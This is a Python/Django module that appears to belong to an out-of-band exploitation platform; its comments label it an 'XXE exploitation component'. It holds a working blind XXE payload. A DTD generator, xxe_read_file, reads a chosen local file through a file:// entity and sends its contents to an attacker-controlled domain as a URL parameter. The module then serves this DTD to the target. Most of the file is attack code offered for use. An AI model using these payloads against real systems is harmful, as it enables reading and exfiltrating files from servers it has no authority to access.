from django.http import HttpResponse
from modules.template.depend.base import BaseTemplate
from rest_framework.response import Response


class XxeTemplate(BaseTemplate):
    info = [{
        "template_info": {
            "name": "XXE",  # 组件名
            "title": "XXE漏洞利用组件",  # 组件展示标题名
            "author": "bios000",  # 组件作者
            "type": 0,  # 组件类型，1是监听0是利用
            "desc": "",  # 组件介绍
            "desc_url": "",  # 组件使用说明链接
            "choice_type": 1,  # 组件选择类型0是单选，1是多选
            "payload": """<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "http://{domain}/{key}">
    %xd;
]>
<root>&bbbb;</root>""",
            "file_name": "xxe.py"
        },
        "item_info": [{
            "name": "xxe_read_file",
            "config": ["path"],
        }],
    }]

    def __init__(self):
        super().__init__()
        self.key = None

    def xxe_read_file(self, item):
        """
        读取文件
        """
        read_file_code = """<!ENTITY % aaaa SYSTEM "file://{{path}}">
<!ENTITY % demo "<!ENTITY bbbb SYSTEM 'http://{{domain}}/{{key}}?message=%aaaa;'>">
%demo;
        """
        return self.replace_code(code=read_file_code)

    def generate(self, key, config):
        code = ''
        self.key = key
        try:
            for i in config:
                item_name = i["name"]
                for name in self.__dir__():
                    if name == item_name:
                        code = code + getattr(self, name)(i)
            return HttpResponse(code, content_type='application/xhtml+xml')
        except Exception as e:
            import traceback
            traceback.print_exc()
            return Response({'status': 'false', 'message': '操作失败'})
